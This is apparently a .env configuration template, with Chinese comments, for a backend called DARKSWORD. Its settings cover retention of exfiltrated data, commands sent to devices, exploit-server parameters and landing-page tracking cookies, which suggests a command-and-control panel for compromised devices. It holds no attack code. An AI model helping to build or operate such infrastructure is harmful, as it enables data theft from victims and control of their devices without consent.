SECRET_KEY=
AUTH_RATE_LIMIT=5/minute
CORS_ORIGINS=*
ACCESS_TOKEN_EXPIRE_MINUTES=30
DARKSWORD_PUBLIC_BASE=

# ───────────────────────── 可覆盖配置（对应 settings 面板 + config_constants.py）
# 所有配置优先级：settings DB 表 > 此处 .env > 代码默认值（详见 admin/config_constants.py DEFAULTS 表格）
# 取消注释即可覆盖；注释保留=使用默认值

# ── retention / 数据保留
#RETENTION_LOG_DAYS=30          # logs 表保留天数(先gz归档到logs_archive/再删除)
#RETENTION_AUDIT_DAYS=90        # audit_logs 审计日志保留天数
#RETENTION_EXFIL_DAYS=365       # exfil_data 采集数据保留天数(直接删除，不归档)
#RETENTION_FS_LOG_DAYS=30       # logs/ 磁盘 .log 文件保留天数
#RETENTION_ARCHIVE_BATCH=5000   # 日志归档单批次 SELECT 行数(内存/IO折中)
#RETENTION_DELETE_CHUNK=500     # IN 删除的 chunk 大小(SQLite安全上限)
#RETENTION_BACKUP_KEEP_DAYS=14  # backup/ 目录备份文件保留天数

# ── cron / 守护定时任务（FastAPI lifespan 里启动，独立于操作系统 cron）
#CRON_ROTATE_START=03:30          # 日志轮转窗口起始 HH:mm
#CRON_ROTATE_WINDOW_MIN=10        # 起始时间起多少分钟内允许执行
#CRON_ROTATE_TICK_SEC=60          # 守护协程轮询间隔(秒)
#CRON_CMD_TIMEOUT_MIN=30          # commands.executing 超过多少分钟置 timeout
#CRON_CMD_TICK_SEC=300            # 命令超时守护轮询间隔(秒)

# ── auth / 2FA / session
#AUTH_OTP_PENDING_TTL=300      # 第一次密码通过后 pending 2FA token TTL(秒)
#AUTH_SETUP_TOKEN_TTL=600      # 强制2FA setup_temp_token TTL(秒)
#AUTH_CHANNEL_TS_SKEW=300      # 渠道上报 register 允许的时间戳偏差(秒)
#AUTH_ACTIVE_DEVICE_MIN=30     # 「在线设备」判定的最近活跃分钟阈值
#AUTH_DASH_MAX_DAYS=90         # 仪表盘查询区间上限(天)，超过自动截断防慢查询

# ── rate limits / 接口限流 (slowapi + @rate_limit 双重防护)
#LIMIT_AUTH_LOGIN=5           # 登录 /api/auth/token 每IP每分钟(防爆破)
#LIMIT_AUTH_2FA=30            # 2FA 验证/绑定 每用户每分钟
#LIMIT_AUTH_SEND_OTP=3        # OTP 发送 每IP每分钟
#LIMIT_CMD_SEND=180           # 命令下发 每用户每分钟
#LIMIT_CMD_BULK=10            # 批量命令/批量操作 每用户每分钟
#LIMIT_TFA_SETUP=10           # 2FA setup 接口 每用户每分钟
#LIMIT_TFA_VERIFY_TEST=5      # 2FA verify-test 每用户每分钟

# ── device / exploit server 侧参数
#DEVICE_COOKIE_MAX_AGE=2592000  # 落地页 ds_chid/ds_tpid/ds_uuid cookie Max-Age(秒)，默认30天
#DEVICE_LOG_TAIL_LINES=500      # /logs 查看页默认尾部行数
#DEVICE_SANITIZE_PATH_MAX=500   # sanitize_path URL/path 输入截断字符数
#DEVICE_EXFIL_DESC_MAX=500      # exfil_data.description 写入前自动截断字符数

# ── pagination / 列表分页默认值
#PAGE_DEFAULT_LIMIT=100    # 列表默认 limit
#PAGE_MAX_LIMIT=500        # 列表允许最大 limit(超过自动截断防OOM)

# ── frontend route defaults (前端 path 常量；与后端返回一致即可)
#FE_ROUTE_LOGIN=/login
#FE_ROUTE_DASHBOARD=/dashboard
